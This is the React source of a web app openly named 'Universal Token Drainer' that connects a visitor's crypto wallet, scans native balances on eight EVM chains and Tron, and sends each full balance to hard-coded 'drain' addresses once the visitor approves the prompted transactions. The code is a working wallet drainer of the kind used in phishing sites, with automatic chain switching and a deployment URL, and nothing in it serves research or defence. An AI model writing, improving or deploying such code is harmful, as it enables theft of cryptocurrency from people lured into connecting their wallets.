import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base } from 'wagmi/chains';
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { useAccount, useDisconnect, useBalance, useSwitchChain } from 'wagmi';
import { parseEther, formatEther, createPublicClient, http as viemHttp } from 'viem';
import './mobile-fix.css';

// ==================== SIMPLIFIED NETWORKS (WORKING ENDPOINTS ONLY) ====================
const NETWORKS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://eth.llamarpc.com', // Working RPC
    explorer: 'https://etherscan.io',
    chainId: '0x1'
  },
  { 
    id: 56, 
    name: 'BNB Smart Chain', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed1.binance.org', // Working endpoint
    explorer: 'https://bscscan.com',
    chainId: '0x38'
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon-rpc.com', 
    explorer: 'https://polygonscan.com',
    chainId: '0x89'
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arb1.arbitrum.io/rpc',
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1'
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa'
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105'
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://api.avax.network/ext/bc/C/rpc',
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a'
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.ftm.tools', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa'
  },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
};

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  TRX: 0.12,
  SOL: 100,
  BTC: 45000,
};

// ==================== FIXED WAGMI CONFIG ====================
const config = createConfig(
  getDefaultConfig({
    appName: "Universal Drainer",
    appDescription: "Universal Token Drainer",
    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://frontend-4rke.onrender.com',
    appIcon: "https://frontend-4rke.onrender.com/favicon.ico",
    
    chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, fantom],
    
    walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
    
    transports: {
      [mainnet.id]: http('https://eth.llamarpc.com'),
      [polygon.id]: http('https://polygon-rpc.com'),
      [bsc.id]: http('https://bsc-dataseed1.binance.org'),
      [arbitrum.id]: http('https://arb1.arbitrum.io/rpc'),
      [optimism.id]: http('https://mainnet.optimism.io'),
      [base.id]: http('https://mainnet.base.org'),
      [avalanche.id]: http('https://api.avax.network/ext/bc/C/rpc'),
      [fantom.id]: http('https://rpc.ftm.tools'),
    },
  })
);

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiProvider config={config}>
      <ConnectKitProvider
        mode="dark"
        options={{
          hideNoWalletCTA: false,
          hideQuestionMarkCTA: true,
          hideTooltips: false,
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          mobileLinks: ['metamask', 'trust', 'coinbase'],
          walletConnectCTA: "QR",
          avoidLayoutShift: true,
          hideRecentBadge: false,
        }}
        theme="midnight"
        customTheme={{
          '--ck-font-family': 'system-ui, sans-serif',
          '--ck-border-radius': '12px',
          '--ck-accent-color': '#ef4444',
          '--ck-accent-text-color': '#ffffff',
          '--ck-body-background': '#0a0a0a',
        }}
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiProvider>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, chainId } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [showTron, setShowTron] = useState(false);

  const autoStarted = useRef(false);

  // ==================== DETECT MOBILE & WALLET ====================
  useEffect(() => {
    const detectWalletAndMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
      setMobileDetected(isMobile);
      
      // Enhanced wallet detection
      const ethereum = window.ethereum;
      if (!ethereum) {
        setWalletType('No Wallet');
        return;
      }
      
      // Check for specific wallet providers
      if (ethereum.isMetaMask) {
        setWalletType('MetaMask');
      } else if (ethereum.isTrust) {
        setWalletType('Trust Wallet');
      } else if (ethereum.isCoinbaseWallet) {
        setWalletType('Coinbase Wallet');
      } else if (ethereum.isTokenary) {
        setWalletType('Tokenary');
      } else if (ethereum.isTronLink) {
        setWalletType('TronLink');
        setShowTron(true);
      } else if (ethereum.isPhantom) {
        setWalletType('Phantom');
      } else if (ethereum.isRabby) {
        setWalletType('Rabby');
      } else if (ethereum.isOKXWallet) {
        setWalletType('OKX Wallet');
      } else if (ethereum.isBitKeep) {
        setWalletType('BitKeep');
      } else if (ethereum.isImToken) {
        setWalletType('imToken');
      } else {
        setWalletType('Injected Wallet');
        
        // Try to detect from provider info
        if (ethereum.providers?.length > 0) {
          for (const provider of ethereum.providers) {
            if (provider.isMetaMask) setWalletType('MetaMask (Multi)');
            else if (provider.isCoinbaseWallet) setWalletType('Coinbase (Multi)');
          }
        }
      }
      
      // Check for Tron separately
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        setWalletType('TronLink');
        setShowTron(true);
      }
      
      // Check for Solana
      if (window.solana && window.solana.isPhantom) {
        setWalletType('Phantom');
      }
    };

    detectWalletAndMobile();
    
    // Listen for wallet changes
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', () => {
        window.location.reload();
      });
      
      window.ethereum.on('chainChanged', () => {
        window.location.reload();
      });
    }
  }, []);

  // ==================== SIMPLIFIED AUTO-SCAN ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected");
      
      // Short delay then scan
      setTimeout(() => {
        scanCurrentNetwork();
      }, 500);
    }
  }, [isConnected, address]);

  // ==================== SCAN CURRENT NETWORK ====================
  const scanCurrentNetwork = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning current network...");
    
    try {
      const currentChain = NETWORKS.find(n => n.id === chainId) || NETWORKS[0];
      const balance = await getNativeBalance(address, currentChain);
      
      if (balance > 0.000001) {
        const usdValue = balance * (TOKEN_PRICES[currentChain.symbol] || 1);
        const token = {
          id: `${currentChain.id}-${Date.now()}`,
          network: currentChain.name,
          symbol: currentChain.symbol,
          amount: balance.toFixed(6),
          rawAmount: balance,
          chainId: currentChain.id,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[currentChain.id] || DRAIN_ADDRESSES[1],
          valueUSD: usdValue,
          usdPrice: TOKEN_PRICES[currentChain.symbol] || 1
        };
        
        setTokens([token]);
        setTotalValue(usdValue);
        setStatus(`✅ Found ${balance.toFixed(4)} ${currentChain.symbol} • $${usdValue.toFixed(2)}`);
      } else {
        setStatus("❌ No balance found on current network");
      }
    } catch (error) {
      console.error("Scan error:", error);
      setStatus("⚠️ Scan failed - try manual scan");
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning all networks...");
    setTokens([]);
    setScanProgress(0);
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      
      for (let i = 0; i < NETWORKS.length; i++) {
        const network = NETWORKS[i];
        setStatus(`Scanning ${network.name}...`);
        
        try {
          const balance = await getNativeBalance(address, network);
          if (balance > 0.000001) {
            const usdValue = balance * (TOKEN_PRICES[network.symbol] || 1);
            const token = {
              id: `${network.id}-${Date.now()}-${i}`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: network.id,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
              valueUSD: usdValue,
              usdPrice: TOKEN_PRICES[network.symbol] || 1
            };
            
            allTokens.push(token);
            totalUSD += usdValue;
          }
        } catch (error) {
          console.log(`Failed to scan ${network.name}:`, error.message);
        }
        
        setScanProgress(Math.round(((i + 1) / NETWORKS.length) * 100));
        await new Promise(resolve => setTimeout(resolve, 300)); // Rate limiting
      }
      
      // Check Tron if available
      if (showTron) {
        try {
          const tronBalance = await getTronBalance(address);
          if (tronBalance > 0.000001) {
            const usdValue = tronBalance * TOKEN_PRICES.TRX;
            const tronToken = {
              id: `tron-${Date.now()}`,
              network: 'Tron',
              symbol: 'TRX',
              amount: tronBalance.toFixed(6),
              rawAmount: tronBalance,
              chainId: 'tron',
              type: 'non-evm',
              drainAddress: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
              valueUSD: usdValue,
              usdPrice: TOKEN_PRICES.TRX
            };
            allTokens.push(tronToken);
            totalUSD += usdValue;
          }
        } catch (error) {
          console.log("Tron scan failed:", error);
        }
      }
      
      if (allTokens.length > 0) {
        setTokens(allTokens);
        setTotalValue(totalUSD);
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
      } else {
        setStatus("❌ No tokens found");
      }
      
    } catch (error) {
      setStatus(`❌ Scan error: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  // ==================== GET NATIVE BALANCE ====================
  const getNativeBalance = async (address, network) => {
    try {
      // Try multiple methods
      const methods = [
        // Method 1: Direct RPC call
        async () => {
          const response = await fetch(network.rpc, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: 1,
              method: "eth_getBalance",
              params: [address, "latest"]
            }),
          });
          
          if (!response.ok) throw new Error('RPC failed');
          
          const data = await response.json();
          if (data.error) throw new Error(data.error.message);
          
          return parseInt(data.result, 16) / 1e18;
        },
        
        // Method 2: Use wagmi/viem client
        async () => {
          const client = createPublicClient({
            chain: NETWORKS.find(n => n.id === network.id),
            transport: viemHttp(network.rpc)
          });
          
          const balance = await client.getBalance({ address: address });
          return Number(formatEther(balance));
        },
        
        // Method 3: Fallback to third-party API
        async () => {
          if (network.id === 1) {
            const response = await fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`);
            const data = await response.json();
            return (data.ETH?.balance || 0);
          }
          return 0;
        }
      ];
      
      for (const method of methods) {
        try {
          return await method();
        } catch (e) {
          continue;
        }
      }
      
      return 0;
    } catch (error) {
      console.error(`Balance check failed for ${network.name}:`, error);
      return 0;
    }
  };

  // ==================== GET TRON BALANCE ====================
  const getTronBalance = async (address) => {
    try {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const balance = await window.tronWeb.trx.getBalance(address);
        return balance / 1e6;
      }
      
      // Fallback to TronGrid API
      const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
      const data = await response.json();
      return (data.data?.[0]?.balance || 0) / 1e6;
    } catch (error) {
      console.error("Tron balance error:", error);
      return 0;
    }
  };

  // ==================== DRAIN TOKENS ====================
  const drainTokens = async () => {
    if (tokens.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Starting drain process...`);
    
    const successfulTxs = [];
    
    for (const token of tokens) {
      try {
        setStatus(`⚡ Draining ${token.amount} ${token.symbol}...`);
        
        if (token.type === 'evm') {
          const result = await drainEvmToken(token);
          if (result.success) {
            successfulTxs.push({
              ...token,
              txHash: result.hash,
              timestamp: Date.now()
            });
          }
        } else if (token.chainId === 'tron') {
          const result = await drainTronToken(token);
          if (result.success) {
            successfulTxs.push({
              ...token,
              txHash: result.hash,
              timestamp: Date.now()
            });
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        
      } catch (error) {
        console.log(`Failed to drain ${token.symbol}:`, error);
      }
    }
    
    // Update state
    setTransactions(prev => [...prev, ...successfulTxs]);
    setTokens(prev => prev.filter(t => !successfulTxs.find(stx => stx.id === t.id)));
    setTotalValue(prev => prev - successfulTxs.reduce((sum, tx) => sum + tx.valueUSD, 0));
    
    if (successfulTxs.length > 0) {
      setStatus(`✅ Successfully drained ${successfulTxs.length} tokens`);
    } else {
      setStatus("❌ Drain failed for all tokens");
    }
    
    setIsProcessing(false);
  };

  // ==================== DRAIN EVM TOKEN ====================
  const drainEvmToken = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('No wallet detected');
      }
      
      // Get current chain
      const currentChainId = await window.ethereum.request({ 
        method: 'eth_chainId' 
      });
      
      const targetChainId = `0x${token.chainId.toString(16)}`;
      
      // Switch chain if needed
      if (currentChainId !== targetChainId) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }],
          });
          
          // Wait for switch
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError) {
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: targetChainId,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              
              // Switch after adding
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: targetChainId }],
              });
              
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
          } else {
            throw switchError;
          }
        }
      }
      
      // Prepare transaction
      const amountWei = parseEther(token.amount.toString());
      
      // Get gas price
      const gasPrice = await window.ethereum.request({
        method: 'eth_gasPrice',
      });
      
      const txParams = {
        from: address,
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x' + (21000).toString(16),
        gasPrice: gasPrice,
      };
      
      // Send transaction
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams],
      });
      
      console.log(`✅ Transaction sent: ${txHash}`);
      return { success: true, hash: txHash };
      
    } catch (error) {
      console.error('Drain error:', error);
      return { 
        success: false, 
        error: error.message || 'Transaction failed' 
      };
    }
  };

  // ==================== DRAIN TRON TOKEN ====================
  const drainTronToken = async (token) => {
    try {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const transaction = await window.tronWeb.transactionBuilder.sendTrx(
          token.drainAddress,
          token.rawAmount * 1e6,
          address
        );
        
        const signedTx = await window.tronWeb.trx.sign(transaction);
        const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
        
        return { success: true, hash: result.txid };
      } else {
        throw new Error('TronLink not detected');
      }
    } catch (error) {
      console.error('Tron drain error:', error);
      return { success: false, error: error.message };
    }
  };

  // ==================== HANDLERS ====================
  const handleManualScan = () => {
    scanAllNetworks();
  };

  const handleDisconnect = () => {
    disconnect();
    setStatus('Ready to connect');
    setTokens([]);
    setTotalValue(0);
    setConnectionError('');
    autoStarted.current = false;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL TOKEN DRAINER</h1>
              <p className="subtitle">{NETWORKS.length} Networks • Auto-Detect • Real-Time</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-info">
                  <div className="wallet-address">
                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                  </div>
                  {walletType && <div className="wallet-type">{walletType}</div>}
                  {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
                </div>
                <button onClick={handleDisconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <div className="connect-section">
                <ConnectKitButton />
              </div>
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : tokens.length > 0 ? '✅' : '📊'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">ACTIVE SESSION</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Progress: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{walletType}</div>
                    <div className="stat-label">Wallet</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{chainId || 'N/A'}</div>
                    <div className="stat-label">Chain ID</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={handleManualScan}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? 'Scanning...' : '🔍 Scan All Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={drainTokens}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    {isProcessing ? 'Processing...' : '⚡ Drain All Tokens'}
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens ({tokens.length})</h3>
                    <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                        </div>
                        <div className="token-amount">{token.amount} {token.symbol}</div>
                        <div className="token-value">${token.valueUSD.toFixed(2)}</div>
                        <div className="token-drain">
                          Drain to: {token.drainAddress.substring(0, 6)}...
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Recent Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Recent Transactions ({transactions.length})</h3>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(-5).reverse().map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="tx-symbol">{tx.symbol}</div>
                        <div className="tx-amount">{tx.amount}</div>
                        <div className="tx-status">✅ Success</div>
                        <div className="tx-time">
                          {new Date(tx.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="welcome-text">
                  Connect any wallet to automatically scan and drain tokens 
                  across {NETWORKS.length} major blockchains.
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                
                <div className="supported-chains">
                  <h4>Supported Networks:</h4>
                  <div className="chains-grid">
                    {NETWORKS.map(network => (
                      <div key={network.id} className="chain-badge" style={{color: network.color}}>
                        {network.symbol}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="status-dot"></span>
            <span>Universal Drainer • v3.0 • Production Ready</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: #0a0a0a;
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #222;
          margin-bottom: 30px;
          flex-wrap: wrap;
          gap: 20px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: linear-gradient(135deg, #ef4444, #dc2626);
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 22px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 15px;
          background: #111;
          padding: 10px 15px;
          border-radius: 12px;
          border: 1px solid #333;
        }
        
        .wallet-info {
          display: flex;
          align-items: center;
          gap: 10px;
          flex-wrap: wrap;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: 'Courier New', monospace;
          font-size: 14px;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #3b82f6;
          padding: 4px 8px;
          background: rgba(59, 130, 246, 0.1);
          border-radius: 6px;
        }
        
        .mobile-badge {
          color: #10b981;
          font-size: 12px;
        }
        
        .disconnect-btn {
          background: #dc2626;
          color: white;
          border: none;
          padding: 8px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          transition: background 0.3s;
        }
        
        .disconnect-btn:hover {
          background: #b91c1c;
        }
        
        /* Status Dashboard */
        .status-card {
          background: #111;
          border-radius: 12px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 1px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-title {
          font-size: 12px;
          color: #888;
          text-transform: uppercase;
          letter-spacing: 1px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 16px;
          font-weight: 600;
          color: white;
        }
        
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 4px;
          background: #333;
          border-radius: 2px;
          overflow: hidden;
          margin-bottom: 5px;
        }
        
        .progress-fill {
          height: 100%;
          background: #ef4444;
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          text-align: right;
        }
        
        .stats-row {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .stat {
          background: #111;
          border-radius: 10px;
          padding: 15px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 12px;
          text-transform: uppercase;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 15px 20px;
          border: none;
          border-radius: 10px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: #3b82f6;
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: #2563eb;
          transform: translateY(-2px);
        }
        
        .btn-drain {
          background: #ef4444;
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: #dc2626;
          transform: translateY(-2px);
        }
        
        /* Tokens Panel */
        .tokens-panel {
          background: #111;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
          padding-bottom: 15px;
          border-bottom: 1px solid #333;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .total-value {
          font-size: 18px;
          font-weight: 700;
          color: #10b981;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 10px;
          padding: 15px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 18px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
        }
        
        .token-amount {
          font-size: 20px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 16px;
          margin-bottom: 10px;
        }
        
        .token-drain {
          color: #888;
          font-size: 11px;
          font-family: monospace;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #111;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          display: flex;
          align-items: center;
          padding: 12px;
          background: #1a1a1a;
          border-radius: 8px;
          border: 1px solid #333;
          gap: 15px;
        }
        
        .tx-symbol {
          font-weight: 600;
          color: #ef4444;
          width: 40px;
        }
        
        .tx-amount {
          flex: 1;
          font-family: monospace;
        }
        
        .tx-status {
          color: #10b981;
          font-size: 12px;
        }
        
        .tx-time {
          color: #888;
          font-size: 12px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 40px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 16px;
          line-height: 1.6;
        }
        
        .supported-chains {
          margin-top: 40px;
          padding: 20px;
          background: #111;
          border-radius: 12px;
        }
        
        .supported-chains h4 {
          margin: 0 0 15px 0;
          color: #ddd;
          font-size: 16px;
        }
        
        .chains-grid {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          justify-content: center;
        }
        
        .chain-badge {
          padding: 6px 12px;
          background: #222;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
          border: 1px solid #333;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
          flex-wrap: wrap;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Mobile Responsive */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            text-align: center;
          }
          
          .header-left {
            flex-direction: column;
            text-align: center;
          }
          
          .connected-wallet {
            flex-direction: column;
            width: 100%;
          }
          
          .wallet-info {
            justify-content: center;
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .transaction-item {
            flex-wrap: wrap;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
